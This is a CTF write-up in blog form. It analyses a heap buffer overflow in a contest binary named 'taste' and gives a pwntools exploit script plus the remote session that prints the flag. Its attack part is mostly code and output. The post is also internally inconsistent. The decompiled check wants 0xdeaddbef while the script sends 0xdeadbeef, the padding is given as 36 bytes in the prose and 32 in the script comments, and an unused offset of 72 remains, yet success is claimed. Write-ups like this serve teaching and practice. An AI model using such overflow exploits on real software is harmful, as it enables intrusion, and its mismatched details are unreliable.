@@ -1,0 +1,187 @@
+---
+title: 'Pwn / taste'
+description: 'Maxim claims that he is alive and full of energy. But inside, he has been dead for a long time. All you have to do is confirm it.'
+date: 2026-01-12
+tags: ['ctf', 'pwn', 'heap-overflow', 'binary-exploitation']
+authors: ['w6rst']
+order: 1
+---
+
+import { Code } from 'astro-expressive-code/components'
+import Challenge from '@/components/mdx/Challenge.astro'
+import Callout from '@/components/mdx/Callout.astro'
+import taste_checksec from './assets/taste_checksec.txt?raw'
+
+## taste
+
+<Challenge
+  category="Pwn"
+  files={['taste', 'libc.so.6', 'ld-linux-x86-64.so.2']}
+  description="Maxim claims that he is alive and full of energy. But inside, he has been dead for a long time. All you have to do is confirm it."
+/>
+
+Basic binary protections:
+
+<Code code={taste_checksec} lang="ansi" />
+
+Like the previous challenge, **No PIE** is enabled, giving us fixed addresses.
+
+## Program Analysis
+
+In this challenge, we were given a binary named `taste`. Let’s try to examine the decompiled code.
+
+### main
+
+```c
+int main(void)
+{
+  char *__buf;
+  int *__ptr;
+  
+  _init_streams();
+  
+  __buf = (char *)malloc(0x10);
+  __ptr = (int *)malloc(8);
+  
+  __ptr[0] = 1;
+  __ptr[1] = 0;
+  
+  printf("Enter name: ");
+  read(0, __buf, 100);
+  
+  if (__ptr[1] == (int)0xdeaddbef) {
+    print_flag();
+  }
+  else {
+    puts("[-] Access Denied.");
+  }
+  
+  free(__buf);
+  free(__ptr);
+  
+  return 0;
+}
+```
+
+The `main(){:c}` function initializes the streams and allocates two chunks on the heap. First, it allocates `0x10` (16) bytes for a name buffer (`__buf`), followed by `8` bytes for a control structure (`__ptr`). It then prompts for a name and reads up to `100` bytes—a clear **Heap Buffer Overflow** since the buffer is only 16 bytes.
+
+The goal is to reach the conditional at line 17: `if (__ptr[1] == (int)0xdeaddbef)`. Since `__ptr` was allocated immediately after `__buf`, the heap allocator places them adjacent in memory.
+
+### print_flag
+
+```c
+void print_flag(void)
+{
+  char *__s;
+  
+  __s = getenv("FLAG_VAL");
+  if (__s != NULL) {
+    puts(__s);
+  } else {
+    puts("Flag not found!");
+  }
+  return;
+}
+```
+
+The `print_flag(){:c}` function is a simple helper that retrieves the flag from the environment. We need to trigger this function by satisfying the condition in `main(){:c}`.
+
+### Heap Layout
+
+On a 64-bit system, a `malloc(0x10)` request for 16 bytes results in a `0x20` byte chunk (16 bytes for data and 16 bytes for metadata/padding). The layout in memory looks like this:
+
+```text
++------------------------+
+|        __buf           |  <--- Offset 0x00 (16 bytes)
++------------------------+
+|  ptr chunk prev_size   |  <--- Offset 0x10 (8 bytes)
++------------------------+
+|    ptr chunk size      |  <--- Offset 0x18 (8 bytes)
++------------------------+
+|        __ptr[0]        |  <--- Offset 0x20 (4 bytes)
++------------------------+
+|        __ptr[1]        |  <--- Offset 0x24 (4 bytes)
++------------------------+
+```
+
+By overflowing `__buf` with more than 16 bytes, we can reach the metadata and data of the `__ptr` chunk.Specifically, we need to overwrite `__ptr[1]` at offset 36 (`0x24`) with the value `0xdeaddbef`.
+
+Now that we know the bug, let’s move to the exploitation part.
+
+## Exploitation
+
+To pass the check `__ptr[1] == 0xdeaddbef`, we need to construct a payload that:
+1. Fills `__buf` (16 bytes).
+2. Overwrites the chunk metadata for `__ptr` (16 bytes).
+3. Overwrites `__ptr[0]` (4 bytes).
+4. Sets `__ptr[1]` to `0xdeaddbef`.
+
+Total padding needed is `16 + 16 + 4 = 36` bytes.
+
+### Exploit Script
+
+```python
+from pwn import *
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+set follow-fork-mode parent
+set follow-exec-mode same
+continue
+'''.format(**locals())
+
+exe = './taste'
+elf = context.binary = ELF(exe, checksec=False)
+context.terminal = ['tmux', 'splitw', '-h']
+context.log_level = 'debug'
+
+def logleak(name, val):  log.success(name+' = %#x' % val)
+def loglibc(): log.success('libc addr = %#x' % libc.address)
+def logbase(): log.success('pie addr = %#x' % elf.address)
+def sa(delim,data): return io.sendafter(delim,data)
+def sla(delim,line): return io.sendlineafter(delim,line)
+def sl(line): return io.sendline(line)
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+# Lib-C library, can use pwninit/patchelf to patch binary
+# libc = ELF("./libc.so.6")
+# ld = ELF("./ld-2.27.so")
+
+offset = 72
+
+io = start()
+
+
+# p64(0)*3 covers __buf (16) + prev_size (8) = 24 bytes
+# p64(0x21) covers the size field (8) = 32 bytes
+# Then we overwrite __ptr[0] and __ptr[1]
+# We need __ptr[1] (offset +4 from data start) to be 0xdeadbeef
+sl(p64(0x0)*3 + p64(0x21) + p64(0xdeadbeefdeadbeef))
+
+io.interactive()
+```
+
+<Callout type="note" title="Chunk Header">
+  Notice how we overwrite the `size` field with `0x21`. This is because the original chunk size was `0x20`, and the `0x1` bit (PREV_INUSE) is usually set. While not strictly necessary for this specific exploit (since we don't call `free` before the check), it's good practice to maintain heap integrity.
+</Callout>
+
+Running the exploit successfully retrieves the flag.
+
+```bash
+$ python3 xploit.py REMOTE ctf.mf.grsu.by 9071
+[+] Opening connection to ctf.mf.grsu.by on port 9071: Done
+[*] Switching to interactive mode
+Enter name: grodno{Maxim_Kn0ws_Pr10r1t13s}
+```
+
+**Flag:** `grodno{Maxim_Kn0ws_Pr10r1t13s}`
